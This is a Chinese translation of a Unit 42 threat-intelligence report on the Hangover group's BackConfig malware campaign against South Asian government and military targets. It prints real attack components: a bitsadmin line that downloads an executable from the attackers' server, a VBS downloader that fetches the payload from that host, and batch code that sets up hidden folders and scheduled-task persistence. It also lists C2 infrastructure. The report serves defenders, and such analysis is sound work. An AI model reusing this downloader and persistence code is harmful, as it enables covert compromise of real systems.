**原文：[Updated BackConfig Malware Targeting Government and Military
Organizations in South Asia ](https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/ "Updated
BackConfig Malware Targeting Government and Military Organizations in South
Asia ")  
译者：知道创宇404实验室翻译组**

### 摘要

Unit 42安全团队在过去4个月里观察到了Hangover组织(又名Neon, Viceroy Tiger,
MONSOON)使用的BackConfig恶意软件的活动。该组织使用鱼叉式钓鱼攻击，目标包括南亚的政府和军事组织。

BackConfig定制木马具有灵活的插件架构，用于提供各种特性的组件，包括收集系统和键盘记录信息以及上传和执行额外payload的能力。

最初，感染是通过一个武器化的Microsoft Excel
(XLS)文档发生的，该文档通过受感染的合法网站发布，url很可能是通过电子邮件共享的。这些文档使用Visual Basic for
Applications
(VBA)宏代码，如果受害者启用了这些宏代码，就会启动一个由多个组件组成的安装过程，从而导致插件加载程序payload被下载和执行。模块化的特性当然允许对单个组件进行更快的更改，而且对于攻击者来说可能更重要的是，能够阻止沙箱和动态分析系统的方式拆分恶意行为，尤其是在单独分析组件时。

我们基于WildFire的威胁预防平台可以检测到与此组织相关的活动，同时更新PAN-DB
URL过滤解决方案中的“恶意软件”类别，用于已识别恶意的或受危害的域名。

### 初始点

在搜索与特定部门和国家/地区有关的AutoFocus数据时，Unit 42团队首先看到了涉及Windows PE可执行文件(SHA256:
84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c)的活动。

该文件于2020年1月19日首次被发现，已经被两个组织下载——一个国家的政府部门和另一个国家的军事组织。下载的来源是
`http://212.114.52[.]148/request/httpsrequest`，`httpsrequest`文件在本地被存储为`dph.exe`。关于该恶意软件如何被传送的更多细节将在稍后描述。

在这里以及后面讨论的活动中，传送BackConfig恶意软件时在URL路径和文件名中选择术语显然是为了将其混合为良性的操作、路径和文件名。虽然拼写不同，但很容易让人相信payload与DHCP网络服务有关。

这个恶意软件的目的是允许受害者下载和执行一个可执行文件，以及下载和运行批处理文件，以便在终端系统上运行命令。

下面这个示例有一个自定义的“解密”例程，每个字符减去6。以下字符串使用此方法解密:

  * linkrequest[.]live
  * \Adobe\Driver\dwg\pid.txt
  * \Adobe\Driver\dwg\
  * \Adobe\Driver\dwg\wuaupdt.exe

该木马读取以下文件以在C2信标的URL中使用。如果该文件不存在，则可执行文件将退出，而不执行任何其他活动。`pid.txt`文件是在从武器化的Excel文档开始的早期传送和安装阶段创建的。有关此设置过程的更多信息将在稍后部分中介绍。如之前所述，这种行为使得对单个可执行payload组件的自动分析变得更加困难。

  * %USERPROFILE%\Adobe\Driver\dwg\pid.txt

由于在调用HttpOpenRequestA函数时使用了INTERNET_FLAG_SECURE标志，因此C2通道使用HTTPS。信标HTTP请求如下所示：

    
    
    GET /orderme/[contents of pid.txt file] HTTP/1.1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 @/NEW
    Host: linkrequest[.]live [resolving to 23.106.123[.]87]

该木马将在HTTP响应标头中查找以下字段和值：

  * “Content-Type: application”
  * “Content-Type: xDvsds”
  * “Content-Type: Bw11eW”

如果content-type字段包含application的值，则木马将从字符串文件名和Content-Transfer-Encoding之间的HTTP响应头中提取一个文件名。它将使用此文件名在`%USERPROFILE%\Adobe\Driver\dwg\`文件夹中创建一个文件，并将HTTP响应中的数据写到该文件夹中。根据其他两种内容类型，我们认为提供的文件名将是“wuaupdt.exe”或test.bat。

如果content-type字段的值为xDvsds，则该木马将尝试使用ShellExecuteA和“open”方法执行以下文件:

    
    
    %USERPROFILE%\Adobe\Driver\dwg\wuaupdt.exe

如果content-type字段的值为Bw11eW，则该木马将尝试使用ShellExecuteA和“open”方法执行以下文件：

    
    
    %USERPROFILE%\Adobe\Driver\dwg\test.bat

在编写本文时，C2似乎无法使用，并且没有发现进一步的payload。我们相信合成wuaupdt.exe文件将提供进一步的功能以窃取信息、记录击键，并提供直接或通过其下载的其他插件运行其他命令的能力，如奇安信威胁情报中心之前的对先前活动的[调查](https://ti.360.net/blog/articles/donot-group-is-targeting-pakistani-businessman-working-in-china-en/ "调查")。

Unit
42团队已经对许多BackConfig可执行文件进行了粗略的二进制差异分析，并没有发现任何非库函数的重叠，这表明payload是基于[这里](https://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia
"这里")和[这里](https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/ "这里")提到的YTY或EHDev框架。

### PE元数据

该恶意软件样本包含一些有趣的静态工件，包括自签名数字证书，用于对可执行文件进行签名，据称该可执行文件是总部位于加州的Foxit software
Incorporated公司的软件。尚不清楚为什么该组织选择这家公司(以及下面表1中列出的其他公司)来进行模仿，但是，正如前面提到的，它们对文件名和url的使用使它们的payload看起来是良性并值得信任的。

使用这个元数据，以及从基础设施调查中收集到的信息，Unit 42团队能够围绕AutoFocus数据找到额外的BackConfig
PE可执行样本。下面表1和表2列出了过去12个月的样本。

![
](https://images.seebug.org/content/images/2020/05/bbf655ff-54c4-47a1-b83f-3578311c6b1a.png-w331s)
表1 PE的编译时间和使用的数字签名，按先见顺序排列。

存储在可执行文件(SHA256:
84e5629…)中的编译时间似乎在第一次WildFire分析系统发现该文件的时间之后。尽管PE文件的时间戳可以修改，但更可能用时区来解释这种奇怪。太平洋时间19日2349就是孟加拉国20日1350，
UTC 7:26am则是整个南亚地区的11:26-13:26，这使得样本编译紧跟传送之后。

有关自签名数字证书的更多细节，以及完整的哈希，可以在本文末尾的IOCs部分中找到。

下表显示了来自相同PE文件的版本信息，按类似的文件描述字段分组。顺序保持不变，除了样本(SHA256:
18ce3ee…)，该样本于2020年1月16日首次出现，但由于某些原因恢复使用了在两个月到三个月前的样本中看到的准确版本信息。也就是说，链接查找器。

![
](https://images.seebug.org/content/images/2020/05/d7365403-199b-48e1-891d-fa1f5352e2d6.png-w331s)
表2 PE版本信息元数据，按先见顺序排序，并按匹配数据分组。

其中，该文件(SHA256:
1510996…)在主题方面具有最大的一致性，使用Foxit版权信息、自签名数字签名，甚至使用公司logo作为可执行文件的图标。该文件的版权信息与Foxit的Reader软件唯一不同的是缺少了一个句号，这意味着它是复制而不是被创建的。

随后，该组织开始使用看似虚构的公司和产品名称，同时在数字签名中混合使用签名者的名称。在过去的11个月中，根本没有使用任何文件图标。

最近的样本还包括文件描述、产品名称和版权字段中的西里尔文本。我们很难知道，这是否是在为BackConfig恶意软件的来源设置虚假标记，还是使内容与受害者组织内的特定目标更加相关。

### 传播与安装

在本节中，我们将根据我们在客户网络中所看到的，以及我们通过开源研究所建立的，描述各种payload是如何传送的。Unit
42还没有看到用于发送BackConfig的武器化文件被附在钓鱼邮件上任何证据，而邮件中的钓鱼URL链接似乎是Hangover组织的惯用手法。

本节的其余部分主要关注对象链接和嵌入(OLE) Microsoft
Excel文档，因为Hangover组织最常用的这些文档，至少在涉及BackConfig恶意软件时是这样。然而，通过基础设施分析，Unit
42能够使用C2域名`matissues[.]com` 找到BackConfig PE样本(SHA256:
e28f1bc0b0910757b25b2146ad027ee66b206a5fe66ce68a28f4ab1538d6a1f;首先被发现在2019年10月24日)，并由武器化富文本格式(RTF)文件(SHA256:
752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f)于同日删除。

RTF使用CVE-2017-11882漏洞，针对Office应用程序中等式编辑器漏洞执行PE样本，这是一种与其他所有分析样本相比独特的漏洞利用方法。

### 受损的第三方基础架构

继续从目前为止找到的样本中获得的数据进行分析，我们发现了一些与支持BackConfig恶意软件传送的受损第三方基础设施相关的url。下表列出了一些受感染的站点的示例，这些站点提供带有文件名的武器化XLS文件，如`Circular_No_03.xls`(SHA256:
0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf)
和`Circullar_Nov_2017.xls`(SHA256:
ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb)，这些文件的内容或与向大量用户分发的信件或广告有关。

![
](https://images.seebug.org/content/images/2020/05/f812f424-fd5f-493b-847a-df657432f5b1.png-w331s)
表3 支持BackConfig传送的受损的第三方基础架构

考虑到攻击目标以及受感染的第三方网站，我们认为，在上述某些URL中使用“fbr”可能与巴基斯坦联邦税务局（FBR）政府组织相关。“fbr”主题也可以在VBA宏代码中运行。文件`ed638b5…`包含语句`Const
WelcomePage = "FBR"`。

上面表3中的旧托管示例不依赖于PHP服务器端脚本来提供武器化的XLS文件。相反，页面只是使用HTTP响应状态301(永久移动)将URL重定向到指定的XLS，从而启动下载。最近的样例中使用了PHP和匹配社会工程主题的URL文件名，例如“fbr”。此外，该组织使用PHP脚本将任何访问页面的访问者记录在名为“info”的文件中，包括时间戳、客户端操作系统及其IP地址。

受损的第三方基础设施或组织，与Unit
42所看到的攻击目标一致。这可能纯粹是巧合，或者是该威胁组织的一个信号，表明他们的意图是利用目标国家基础设施的弱点，或者普遍受信任的国内基础设施。

Palo Alto Networks 公司的 WildFire
沙箱于2017年11月8日分析了样本`ed638b5`，如上表所示，该样本托管在两个受影响的网站上：孟加拉国的一所学校和马尔代夫的一家船运公司。虽然Unit
42在马尔代夫还没有发现Hangover组织的迹象，但这个群岛和其他已知的目标都在这一地区。有趣的是，在Unit 42分析样本一周后，新总统宣誓就职。

EXE payload(SHA256:
4104a871e03f312446ef2fb041077167a9c6648d48825cbc1584e4fa792cd)直接由样本`ed638b5`的VBA代码从下面的
URL下载，与BitDefender在[这里](https://labs.bitdefender.com/2017/09/ehdevel-the-story-of-a-continuously-improving-advanced-threat-creation-toolkit/
"这里")记录的相关。到目前为止，Unit
42只在2017年末看到了6个类似的样本，与之前的更多样本相比，这可能表明了Hangover组织使用的自定义payload发生了变化。当然，在较早的样本和较新的BackConfig样本之间存在一些一致的战术、技术和程序(TTPs)。

    
    
    http://chancetowin.quezknal[.]net/appstore/updatepatch/logs.exe

### 传送Payload的演变

在讲Hangover组织使用的最新样本和安装方法之前，来看看下面的时间线，提供了TTPs使用和演进的高级视图。

![
](https://images.seebug.org/content/images/2020/05/9fb0b24e-5665-4eab-a4ab-b154e7970b88.png-w331s)
图2 传送Payload的演变

尽管经过多年的演变，有些习惯是很难改掉的。首先，Unit
42研究过的每个武器化的XLS都加载一条假的错误消息，如下面图3所示，以欺骗受害者认为文件已经损坏，因此没有任何东西已经或将要按预期加载。另一个过去常用的虚构错误消息文本，有拼写或语法错误。

![
](https://images.seebug.org/content/images/2020/05/8607518e-1fdf-4b77-8c17-431e245b8ca1.png-w331s)
图3 向受害者显示错误消息

同样，存储在所有Excel文档中的版本信息元数据共享相同的“作者”和“最后修改者”名称——“测试”。

以下小节描述了上面时间线图中突出显示的三个最新里程碑的活动和恶意软件

### 2019年里程碑：多组件

上面表3中列出的`Registration
Form.xls`（SHA256：be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461）提供了该组织使用的引诱类型的样本。

在打开XLS并启用宏代码时，下面图中的图片显示在顶部的白色背景单元格上。正如文件名所示，这是一个注册表格，与巴基斯坦政府为帮助解决该国住房短缺而运行的“Naya巴基斯坦住房项目”有关。符合条件的公民包括政府雇员，登记表格截止到2019年10月15日(延长到11月15日)，这意味着10月25日的竞选时间和其诱惑力显然是为了增加感染恶意软件的机会。

![
](https://images.seebug.org/content/images/2020/05/433bd844-a8ac-4863-991f-de066aa7457e.png-w331s)
图4 2019年10月，利用社会工程诱惑巴基斯坦政府

由于在编写本文时，PHP网页并不存在，因此Unit
42无法证明XLS文件`be3f12b…`是托管在上面表3第1行所列的URL上的。然而，由于以下几点，我们对两者之间的竞争关系有高度的信心。

  1. AutoFocus和VirusTotal于2019年10月25日首先处理了XLS文件be3f12b…
  2. VirusTotal在同一天处理了nsaimmigration…URL
  3. 当天，在VirusTotal中处理了使用符号 `nphp_registration_form.php?r=` 的特定HTTP GET请求URL，该URL与 `http://185.203.119[.]184/fin_div/session` 有关联，该IP地址与 XLS be3f12b…删除的VBS代码中的URL结构相匹配
  4. PHP网页nphp_registration_form.php的名称与XLS的文件名有关

XLS文件be3f12b…中的VBA宏代码与前几年的样本有所不同。它没有直接存储编码的EXE文件，也没有直接从VBA代码本身运行批处理shell命令，而是从Excel工作表中隐藏的列(从第27列或“AA”列开始)检索内容，对于大多数人来说，这可能不在屏幕上。更改字体颜色后，分别在AA和AB列中显示了先前变体中的“设置”批处理代码组件以及新的Visual
Basic Script（VBS）下载器组件，如下图5所示。

![
](https://images.seebug.org/content/images/2020/05/5551d7c9-3b07-4ad5-b860-eb94af7a5bfe.png-w331s)
图5 XLS表中显示了VBS下载器和BAT设置文件

XLS中的宏VBA代码逐行解析这两列的内容，将内容写入它们各自在磁盘上的文件，并按照图6中描述的相同流程执行。

### 2019里程碑：BITS和ZIP

一个更新的武器化的XLS文件(SHA256:
021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b)于2019年11月15日经Wildfire分析，并揭示了一些新技术。在这种情况下，VBA宏代码包含一个只有1,062字节大小的十进制编码的ZIP文件。在ZIP归档文件中有两个文本文件，它们将被解压到文件夹driverkit中。文件driverkit.bat是本报告中已讨论并在附录部分列出的“设置”BAT文件，另一个文件Winmgt.txt是对下载的VBS的改编，本报告中也对此进行了描述。但是，该版本没有使用MSXML
DOM对象直接下载HTTP，而是将以下内容写入Winmgt_Drive.bat，由“设置”bat文件创建的第三个计划任务执行。

    
    
    echo off
    bitsadmin /transfer Microsoft_Update /download /priority high 
    http://185.203.119[.]184/winmgt/winmgt.exe 
    %USERPROFILE%\Adobe\Driver\pdf\winmgt.exe
    del %0

### 2020里程碑：微调

以下流程图基于Unit 42检测到的最新武器化文件之一Invoice.xls (SHA256:
8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c;
首次于2020-01-15被检测到)。

感染过程由多个部分组成，一旦VBA将BackConfig插件加载程序写入磁盘并执行，“设置”批处理(BAT)文件就可协调BackConfig插件加载程序的大部分感染过程。

![ ](https://images.seebug.org/content/images/2020/05/a906d0cb-4cfd-401c-a9ee-baef1f1f6bd6.png-w331s) 图6 Backconfig恶意软件执行流程图

下面是图6中编号对应的解释：

  1. 创建文本文件Drive.txt (SHA-256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)并包含十进制解码的VBS内容。
  2. 类似地，VBA代码然后将批处理代码写入另一个文本文件—Audio.txt。这两个文件的内容附在本文附录部分。
  3. Audio.txt被重命名为Audio.bat并执行。
  4. Audio.bat清理与以前的感染相关的所有文件和文件夹，并重新创建所需的环境，包括创建前面提到的pid.txt文件，并将各种文件夹和文件设置为从默认的Windows资源管理器视图中隐藏。pid.txt的内容是受害者的计算机名加上连字符和一个随机数，尽管我相信使用的代码不会像预期的那样工作。
  5. bat继续创建两个调度任务引用两个尚不存在的文件:dphc.exe将每10分钟运行一次并驱动，Drive.vbs每隔20分钟一次。
  6. 最后，在删除自己之前，Audio.bat会将Drive.txt重命名为Drive.vbs。vbs最终由任务调度程序执行，它将下载BackConfig可执行payload。在文件8892279f3中，远程位置是 http://185.203.119[.]184/Dropbox/request。
  7. 当任务调度程序最终执行dph .exe时，它首先检查是否存在pid.txt(步骤4)，并且仅在文件存在时才继续执行。

最后，XLS将两个文件写入磁盘，其中一个文件BAT立即修改一些系统设置并创建两个计划任务。然而，这种行为可能不足以确定为恶意组件。在20分钟之后，任务调度程序才会执行VBS
downloader组件并启动BackConfig loader EXE，此时分析系统可能已经停止监视。

### ATT&CK

下表描述了与本文中描述的多个活动相关联的TTPs。

![
](https://images.seebug.org/content/images/2020/05/3e370f58-a331-4ef9-984f-64bfe22b2094.png-w331s)

### 结论

根据Unit 42的报告，“Hangover”组织(又名Neon, Viceroy Tiger,
MONSOON)非常活跃，目标明确，南亚的政府和军事组织使用带有信件或政府表格的鱼叉式网络钓鱼邮件，引诱受害者浏览受攻击的网站，这些网站提供安装了BackConfig木马的武器化Excel文件。几乎无一例外地，Unit
42检测到的武器化文件需要用户执行。在过去六个月里，我们只看到过一次利用漏洞来绕过用户执行安装链中的部分。

BackConfig的主payload和辅助payload的发展已经见证了执行命令和部署可执行文件的不同方法，有混淆也有不混淆。

最新的版本包含了模块化的组件，可以更轻松地更新和重复使用代码，以便及时快速地部署他们的活动，从而获得最大的成功机会。执行最新样本的方法还表明，该组织的重点是试图通过将恶意活动分解为每个看起来相对良性的模块来避开沙箱和其他自动化分析系统。

### IoC

**传送文档：**

56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6

8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c

021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b

be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461

0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf

ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb

752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using
CVE-2017-11882)

**批处理文件：**

4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt /
.bat from Naya Housing campaign)

C94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9

6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3

750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580

5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295

f64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e

98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e

29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096
(driverkit.bat)

abe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003
(Winmgt_Drive.bat uses bitsadmin)

02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c

**VBS 文件：**

87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1
(One_drivers.txt / .vbs from Naya Housing campaign)

952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a
(Down_LinkLog.vbs)

a1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs
using BITS)

**EXE Payloads：**

306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644

0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92

84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c

18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9

922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709

4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5

677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2

d3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f

91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1

de5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a

f79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b

9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77

6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e

e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f

07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda

31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848

15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892

D87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861

167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e

4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of
older set of downloaders)

b18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5
(driverkit.zip)

**基础架构：**

linkrequest[.]live (23.106.123[.]87)

matissues[.]com

unique.fontsupdate[.]com

185.203.119[.]184（[ZoomEye搜索结果](https://www.zoomeye.org/searchDetail?type=host&title=5e5c0fc72a7f63460156396c060cb644
"ZoomEye搜索结果")）

212.114.52[.]148（[ZoomEye搜索结果](https://www.zoomeye.org/searchResult?q=212.114.52.148
"ZoomEye搜索结果")）

**数字签名：**

下面的自签名数字证书列表并不完整，只与过去12个月在BackConfig PE可执行文件样本中看到的证书有关。

**Foxit:**

thumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01

issuer: CN=Foxit Software Incorporated

subject: CN=Foxit Software Incorporated

version: 3

algorithm: sha1WithRSAEncryption

serial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8

valid from: 1/1/2018

valid to: 1/1/2024

**Wind0ws:**

thumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0

issuer: CN=wind0ws

subject: CN=wind0ws

version: 3

algorithm: sha1WithRSAEncryption

serial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70

valid from: 1/1/2019

valid to: 1/1/2025

**NVIDIA:**

thumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3

issuer: CN=NVIDIA Corporation

subject: CN=NVIDIA Corporation

version: 3

algorithm: sha1WithRSAEncryption

serial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1

valid from: 1/1/2019

valid to: 1/1/2025

### 附录

从XLS样本(SHA-256:
8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83)中提取了以下VBS和BAT代码

  * VBS下载器组件 (SHA256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1)

[Drive.txt -> Drive.vbs CODE]

    
    
    strFileURL = "http://<strong>185.203.119[.]184/Dropbox/request"</strong> 
    Set oShell = CreateObject("WScript.Shell") 
         strHomeFolder = 
    oShell.ExpandEnvironmentStrings("%USERPROFILE%") 
         strPath = "<strong>C:\Drivers\dphc.exe"</strong> 
    On Error Resume Next 
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") 
        objXMLHTTP.open "GET", strFileURL, false 
        objXMLHTTP.send() 
    If objXMLHTTP.Status = 200 Then 
    Set objADOStream = CreateObject("ADODB.Stream") 
    objADOStream.Open 
    objADOStream.Type = 1  
    objADOStream.Write objXMLHTTP.ResponseBody 
    objADOStream.Position = 0     
    Set objFSO = CreateObject("Scripting.FileSystemObject") 
    If objFSO.Fileexists(strPath) Then WScript.Quit() 
    Set objFSO = Nothing 
    objADOStream.SaveToFile strPath 
    objADOStream.Close 
    Set objADOStream = Nothing 
    End if 
    Set objXMLHTTP = Nothing  

  * “设置”BAT组件

[Audio.txt -> Audio.bat CODE]

    
    
    Set oFile = fso.CreateTextFile("c:\Drivers\Audio.txt")
    oFile.WriteLine ("echo off")
    oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\pdf")
    oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\dwg")
    oFile.WriteLine ("md %USERPROFILE%\Daily\Backup\Files")
    oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Adobe")
    oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Daily")
    oFile.WriteLine ("attrib +a +h +s C:\Drivers")
    oFile.WriteLine ("del /f 
    %USERPROFILE%\Adobe\Driver\pdf\pid.txt")
    oFile.WriteLine ("del /f 
    %USERPROFILE%\Adobe\Driver\dwg\pid.txt"
    oFile.WriteLine ("SET /A %COMPUTERNAME%")
    oFile.WriteLine ("SET /A RAND=%RANDOM% 10000 + 1")
    oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% >> 
    %USERPROFILE%\Adobe\Driver\pdf\pid.txt")
    oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% >> 
    <strong>%USERPROFILE%\Adobe\Driver\dwg\pid.txt")</strong>
    oFile.WriteLine ("schtasks /delete /tn Winmgt_log /f")
    oFile.WriteLine ("schtasks /delete /tn Yahoo_Drive /f")
    oFile.WriteLine ("schtasks /create /sc minute /mo 10 /f /tn 
    Winmgt_log /tr C:\Drivers\dphc.exe")
    oFile.WriteLine ("schtasks /create /sc minute /mo 20 /f /tn 
    Yahoo_Drive /tr C:\Drivers\Drive.vbs")
    oFile.WriteLine ("ren C:\Drivers\Drive.txt Drive.vbs ")
    oFile.WriteLine ("del %0")
    oFile.Close
    Set fso = Nothing
    Set oFile = Nothing
    
        Dim OldName, NewName
        GivenLocation = "C:\Drivers\"
        OldName = "Audio.txt"
        <strong>NewName = "Audio.bat"</strong>
        On Error Resume Next
        Name GivenLocation & OldName As GivenLocation & NewName
        Dim RetVal
        RetVal = Shell("C:\Drivers\Audio.bat", vbHide)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1202/>

